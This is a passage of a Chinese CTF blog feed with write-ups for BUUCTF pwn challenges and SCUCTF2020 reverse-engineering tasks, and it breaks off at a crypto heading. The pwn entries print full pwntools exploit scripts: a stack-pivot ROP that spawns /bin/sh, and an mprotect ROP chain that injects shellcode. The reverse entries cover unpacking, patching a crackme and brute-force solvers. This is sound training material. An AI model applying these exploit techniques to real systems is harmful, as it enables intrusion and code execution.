    <content type="html"><![CDATA[<p>这题涉及的知识点是栈迁移。<br>关于栈迁移，贴一篇师傅的博文：<a href="https://bbs.pediy.com/thread-258030.htm">[原创]栈迁移原理（图示)</a>，讲的很好。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>先查看防护<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/ciscn_2019_es_2/checksec.png"></p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>IDA打开，进到vul函数，反汇编代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到read函数存在栈溢出，s距离ebp为0x28，而read只能读入0x30，可以溢出0x30-0x28=0x8个字节，也就是正好覆盖edb和ret。<br>溢出距离不足以构造常规的ROP链，需要利用栈迁移的技巧将栈劫持到我们指定的地址。<br>再审计代码，发现printf函数可以用来泄露栈上的内容，因为memset为s分配了0x20的空间，并全部以\x00进行初始化，而printf函数在打印过程中遇到\x00就会被截断，所以当第一次read的时候构造:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*0x20 + padding</span><br></pre></td></tr></table></figure><p>先把s全部填满，再补齐到ebp前的空间，那么在printf打印s的时候就可以把ebp的内容带出来。</p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>接下来进行gdb动态调试，先贴出调试的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28462)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">sys_addr = <span class="number">0x8048400</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"><span class="comment">#这里的断点选的是这一段：.text:080485CD                 call    _printf</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr = <span class="string">&#x27;0x080485CD&#x27;</span></span>):</span> </span><br><span class="line">    raw_input(<span class="string">&#x27;debug?&#x27;</span>)</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *&quot;</span> + addr)</span><br><span class="line">debug()</span><br><span class="line">p.recvuntil(<span class="string">&quot;your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;c&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.send(payload) <span class="comment">#不可用sendline,不然会多送一个\n</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>进到调试终端后按c继续，查看栈帧：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/ciscn_2019_es_2/gdb1.png"><br>可以看到ebp栈上的内容为栈上的一个地址：leak_addr=0xffa3ee78，它与s的offset=0x40-0x10=0x38，所以s的地址为leak_addr-0x38。<br>我们还需要leave|ret这样的gadget，找一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ciscn_2019_es_2 --only <span class="string">&#x27;leave|ret&#x27;</span> | grep <span class="string">&#x27;leave&#x27;</span></span><br><span class="line">0x080484b8 : leave ; ret</span><br></pre></td></tr></table></figure><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p>所以可以构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">&#x27;fake&#x27;</span> + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(leak_addr-<span class="number">0x28</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += p32(leak_addr-<span class="number">0x38</span>) + p32(leave_ret)</span><br></pre></td></tr></table></figure><p>整个栈迁移的过程如下图所示：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/ciscn_2019_es_2/stack.png"><br>将/bin/sh放置在了距离leak为0x28的位置，system函数传参的时候将地址传进去。</p><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28462)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">sys_addr = <span class="number">0x8048400</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr = <span class="string">&#x27;0x080485CD&#x27;</span></span>):</span></span><br><span class="line">    raw_input(<span class="string">&#x27;debug?&#x27;</span>)</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *&quot;</span> + addr)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.recvuntil(<span class="string">&quot;your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;c&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">leak_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;fake&#x27;</span> + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(leak_addr-<span class="number">0x28</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += p32(leak_addr-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这题涉及的知识点是栈迁移。&lt;br&gt;关于栈迁移，贴一篇师傅的博文：&lt;a href=&quot;https://bbs.pediy.com/thread-258030.htm&quot;&gt;[原创]栈迁移原理（图示)&lt;/a&gt;，讲的很好。&lt;/p&gt;
&lt;h3 id=&quot;Solution&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="BUUCTF" scheme="http://example.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="http://example.com/2021/01/25/get_started_3dsctf_2016/"/>
    <id>http://example.com/2021/01/25/get_started_3dsctf_2016/</id>
    <published>2021-01-25T15:38:00.000Z</published>
    <updated>2021-03-22T15:22:09.141Z</updated>
    
    <content type="html"><![CDATA[<p>今天做的这道3dctf的get_started，感觉很有意思，而且其中的一些知识点和做题方法很有必要做一下记录，以便日后回顾。</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这道题有两种做法，一种是直接利用栈溢出传入对应的参数并使用exit强制退出实现flag的回显，另一种是通过mprotect修改内存并写入shellcode。</p><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>先安全检查，只开启了栈不可执行<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/get_started_3dsctf_2016/1.jpg"></p><p>IDA反汇编进行分析,溢出点在gets函数<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/get_started_3dsctf_2016/2.png"></p><p>另外还给了我们后门函数get_flag<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/get_started_3dsctf_2016/3.png"></p><p>这里我们需要利用gets进行栈溢出，先查看栈帧结构<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/get_started_3dsctf_2016/4.png"><br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/get_started_3dsctf_2016/5.png"><br>偏移量是0x38,这里有点奇怪的是没有ebp。<br>先提一下call指令，在执行call指令时，进行两步操作：<br>1）将当前的IP或CS压入栈中<br>2）转移<br>即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call = push + jmp</span><br></pre></td></tr></table></figure><p>因此我们在栈溢出ret到get_flag函数后，按照函数栈帧的结构，还需将get_flag函数的返回地址入栈。由于函数栈的结构是参数位于返回地址之上，因此payload的组成就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = padding1 + getflag_addr + ret_addr + a1 + a2</span><br><span class="line"><span class="comment"># a1 = 0x308CD64F 参数传入时需要使用在内存中的十六进制表示</span></span><br><span class="line"><span class="comment"># a2 = 0x195719D1</span></span><br></pre></td></tr></table></figure><p>这里有一点要注意的是，在远程服务器上，如果程序异常退出的话，是没有回显结果的，所以要让程序正常退出才行，因此ret_addr可以是exit函数的地址（这个思路来自大佬的博客）。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution1</span>():</span></span><br><span class="line">    <span class="comment"># p = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;29907&#x27;</span>)</span><br><span class="line">    getflag = <span class="number">0x080489A0</span></span><br><span class="line">    exit = <span class="number">0x0804E6A0</span></span><br><span class="line">    a1 = <span class="number">0x308CD64F</span></span><br><span class="line">    a2 = <span class="number">0x195719D1</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(getflag) + p32(exit) + p32(a1) + p32(a2)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><p>###0x2<br>第二种解法是利用mprotect函数修改某一段内存为可读可写可执行，再利用read函数这段内存中写入shellcode<br>exp如下，解题过程改日再补，害，总是喜欢拖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution1</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,&#x27;29907&#x27;)</span></span><br><span class="line">    getflag = <span class="number">0x080489A0</span></span><br><span class="line">    exit = <span class="number">0x0804E6A0</span></span><br><span class="line">    a1 = <span class="number">0x308CD64F</span></span><br><span class="line">    a2 = <span class="number">0x195719D1</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(getflag) + p32(exit) + p32(a1) + p32(a2)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution2</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,&#x27;29838&#x27;)</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    start = <span class="number">0x80ea000</span></span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0x2000</span></span><br><span class="line">    prot = <span class="number">0x7</span></span><br><span class="line">    pop_addr = <span class="number">0x0804f460</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect)</span><br><span class="line">    payload += p32(pop_addr) + p32(start) + p32(<span class="built_in">len</span>) + p32(prot)</span><br><span class="line">    payload += p32(read_addr)</span><br><span class="line">    payload += p32(pop_addr) + p32(<span class="number">0x0</span>) + p32(start) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(start)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    payload_sh = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    p.sendline(payload_sh)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">solution1()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天做的这道3dctf的get_started，感觉很有意思，而且其中的一些知识点和做题方法很有必要做一下记录，以便日后回顾。&lt;/p&gt;
&lt;h2 id=&quot;Solution&quot;&gt;&lt;a href=&quot;#Solution&quot; class=&quot;headerlink&quot; title=&quot;Solut</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SCUCTF2020 新生赛</title>
    <link href="http://example.com/2020/11/29/WriteUp/"/>
    <id>http://example.com/2020/11/29/WriteUp/</id>
    <published>2020-11-28T16:47:00.000Z</published>
    <updated>2021-03-21T07:09:00.322Z</updated>
    
    <content type="html"><![CDATA[<p>SCUCTF赛后的一点小小记录…</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="1-easyF5"><a href="#1-easyF5" class="headerlink" title="1.easyF5"></a>1.easyF5</h3><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.1.png"></p><p>扔进IDA,然后F5得到flag:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.2.png"></p><hr><h3 id="2-easypack"><a href="#2-easypack" class="headerlink" title="2.easypack"></a>2.easypack</h3><p>扔进exeinfope,发现有upx壳</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.1.png"></p><p>直接kali脱壳</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.2.png"></p><p>在OD打开</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.3.png"></p><p>然后右键-&gt;中文搜索引擎-&gt;智能搜索,然后在输入语句后一句双击进入</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.4.png"></p><p>Jnz处F2下断点,F9运行</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.5.png"></p><p>随便输入一串验证码</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.6.png"></p><p>回车后得到flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.7.png"></p><hr><h3 id="3-pytrade"><a href="#3-pytrade" class="headerlink" title="3.pytrade"></a>3.pytrade</h3><p>把pyc文件进行python反编译</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.1.png"></p><p>将flag_base64进行base64解密,得到flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.2.png"></p><hr><h3 id="4-crackme"><a href="#4-crackme" class="headerlink" title="4.crackme"></a>4.crackme</h3><p>OD运行,然后右键-&gt;中文搜索引擎-&gt;智能搜索,双击选中error进入</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.1.png"></p><p>选中输入验证码跳转处</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.2.png"></p><p>顺着红线找到跳转开始处</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.3.png"></p><p>将其nop掉</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.5.png"></p><p>选中刚才用NOP填充的代码段,右键单击“复制到可执行文件”—-“选择”,在新弹出的界面上点击右键–单击“保存文件”,然后选择保存路径和文件名即可。</p><p>打开刚保存的文件,破解成功</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.4.png"></p><hr><h3 id="5-maze"><a href="#5-maze" class="headerlink" title="5.maze"></a>5.maze</h3><p>扔进IDA,F5查看main函数伪代码</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.1.png"></p><p>分析程序可以知道,要救出马老师,需要走15步</p><p><img src="https://gitee.com/see1c3y/scuctf2020/blob/master/re/re5/re5.2.png"></p><p>进一步分析,发现输入的路径需要包括‘D’(ascii码值:68)、‘U’(85)、‘R’(82)这3个字符</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.3.png"></p><p>v4是一个二维数组,也就是迷宫;当s[i] == ’D’时,v4的行下标加1,即向下走;当s[i]==‘U’时,v4的行下标减1,即向上走;当s[i] ==’R‘时,v4的列下标加1,即向右走</p><p>查看maze</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.4.png"></p><p>结合前面的分析可知,maze是一个5行10列的矩阵,编写python 脚本,得到flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maze  =  <span class="string">&quot; *   *****&quot;</span> \</span><br><span class="line">      <span class="string">&quot;   * *****&quot;</span> \</span><br><span class="line">      <span class="string">&quot;****  ****&quot;</span> \</span><br><span class="line">      <span class="string">&quot;*****    *&quot;</span> \</span><br><span class="line">      <span class="string">&quot;********  &quot;</span></span><br><span class="line"></span><br><span class="line">route = <span class="string">&quot;下右右上右右下下右下右右右下右&quot;</span></span><br><span class="line">flag = route.replace(<span class="string">&#x27;下&#x27;</span>, <span class="built_in">chr</span>(<span class="number">68</span>)).replace(<span class="string">&#x27;右&#x27;</span>, <span class="built_in">chr</span>(<span class="number">82</span>)).replace(<span class="string">&#x27;上&#x27;</span>, <span class="built_in">chr</span>(<span class="number">85</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h3 id="6-decryptme"><a href="#6-decryptme" class="headerlink" title="6.decryptme"></a>6.decryptme</h3><p>这是一道算法逆向,先将附件扔进IDA分析</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.1.png"></p><p>定位关键函数encrypt,双击进入</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.2.png"></p><p>加密算法大致思路是:要求输入的字符串v6长度是32,加密函数encrypt传入的两个参数是v4和v6,v6字符串中的每一个字符经过加密,赋值给v4。<br>然后v4和buf进行比较,buf就是v6加密后的结果</p><p>查看buf:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.3.png"></p><p>考虑到flag的字符大都是字母、数字与下划线,可以进行爆破,编写脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择ascii码值在48到122之间的字符</span></span><br><span class="line">buf = <span class="string">&quot;34e8h9?&lt;&lt;mkCD&gt;F@DEDCzHxxKRQRNSRS&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">123</span>):</span><br><span class="line">        v7 = j</span><br><span class="line">        v6 = i</span><br><span class="line">        v4 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            v4 = <span class="number">2</span> * (v6 &amp; v7)</span><br><span class="line">            v7 ^= v6</span><br><span class="line">            v6 = v4</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> v4:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(v7) == buf[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33c5d4954da881814420f3ba39772644</span><br></pre></td></tr></table></figure><hr><h3 id="7-pytrade-plus"><a href="#7-pytrade-plus" class="headerlink" title="7.pytrade-plus"></a>7.pytrade-plus</h3><p>使用pyinstxtractor.py对pytrade-plus.exe进行反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py pytrade-plus.exe</span><br></pre></td></tr></table></figure><p>多出了一个目录:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.1.png"></p><p>在该目录下,找到一个app文件:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.2.png"></p><p>使用notepad++查看,发现controller字段:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.3.png"></p><p>在PYZ-00.pyz_extracted目录下找到controller.pyc,进行反编译,发现flag的加密方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = self._view.textflag.toPlainText()</span><br><span class="line">        flag = flag.replace(<span class="string">&#x27;scuctf&#123;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        flag = flag.replace(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        flag = a2b_hex(flag)</span><br><span class="line">        x = <span class="built_in">int</span>(flag)</span><br><span class="line">        magicnum = <span class="number">0xA046AE0418E4646E7C383ADF588B29280C80B2DB5C320B4F5ACF096009FFC7A831D9B89CA1C65F7E1A6F9297720F7L</span></span><br><span class="line">        <span class="keyword">if</span> (x ** <span class="number">7</span> - <span class="number">300</span> * x ** <span class="number">6</span> - x ** <span class="number">3</span>) + x == magicnum:</span><br><span class="line">            self._view.textflag.setPlainText(<span class="string">&#x27;Yes, it is the real flag!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="literal">None</span>._view.textflag.setPlainText(<span class="string">&#x27;NoNoNo!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        self._view.textflag.setPlainText(<span class="string">&#x27;NoNoNo!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>需要对方程进行求解,然后将解出的x转成16进制字符串,这里使用sympy进行方程求解:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">magicnum = <span class="number">0xA046AE0418E4646E7C383ADF588B29280C80B2DB5C320B4F5ACF096009FFC7A831D9B89CA1C65F7E1A6F9297720F7</span></span><br><span class="line">R1 = solve((x ** <span class="number">7</span> - <span class="number">300</span> * x ** <span class="number">6</span> - x ** <span class="number">3</span>) + x - magicnum, x)[<span class="number">0</span>]</span><br><span class="line">a = <span class="built_in">str</span>(R1).encode()</span><br><span class="line">b = binascii.b2a_hex(a)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment"># scuctf&#123;39333031323433373134303932333037&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="CRYPTO"><a href="#CRYPTO" 